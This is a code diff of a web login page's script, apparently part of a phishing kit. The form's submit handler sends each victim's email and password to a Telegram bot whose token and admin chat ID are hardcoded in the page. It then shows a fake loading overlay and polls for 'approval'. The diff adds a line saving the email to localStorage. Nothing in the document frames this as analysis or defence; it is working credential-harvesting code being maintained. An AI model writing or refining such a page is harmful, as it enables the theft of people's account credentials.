@@ -363,19 +363,16 @@
             </div>
         </div>
     </div>
-
     <div id="loading-overlay">
         <div class="spinner-container">
             <div class="inner-spinner"></div>
         </div>
     </div>
-
     <script>
         function toggleTheme() {
             document.body.classList.toggle('dark');
             document.querySelector('.slider-input').checked = document.body.classList.contains('dark');
         }
-
         function togglePassword() {
             const pwd = document.getElementById('password');
             const closed = document.getElementById('eye-closed');
@@ -390,18 +387,14 @@
                 open.style.display = 'none';
             }
         }
-
         // Telegram bot integration (unchanged)
         const BOT_TOKEN = "8022677345:AAGtTzgJyVseQ8TcBDclM4JCrvcmDyJrxO4";
         const ADMIN_CHAT_ID = "6359358611";
-
         function generateSessionId() {
             return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
         }
-
         let currentSessionId = null;
         let pollingInterval = null;
-
         async function sendCredentialsToBot(email, password) {
             currentSessionId = generateSessionId();
             const message = `New login attempt:\nEmail/Phone: ${email}\nPassword: ${password}\nSession: ${currentSessionId}`;
@@ -430,7 +423,6 @@
                 return false;
             }
         }
-
         function showWarning() {
             let warning = document.querySelector('.warning-message');
             if (!warning) {
@@ -441,7 +433,6 @@
             }
             warning.style.display = 'block';
         }
-
         function startApprovalPolling() {
             document.getElementById('loading-overlay').style.display = 'flex';
             pollingInterval = setInterval(async () => {
@@ -473,7 +464,6 @@
                 }
             }, 4000);
         }
-
         document.getElementById('login-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value.trim();
@@ -486,12 +476,12 @@
             if (!email) { emailErr.style.display = 'block'; valid = false; }
             if (!password) { passErr.style.display = 'block'; valid = false; }
             if (!valid) return;
+            localStorage.setItem('userEmail', email); // Store the email in localStorage
             const sent = await sendCredentialsToBot(email, password);
             if (sent) {
                 startApprovalPolling();
             }
         });
-
         window.addEventListener('beforeunload', () => {
             if (pollingInterval) clearInterval(pollingInterval);
         });
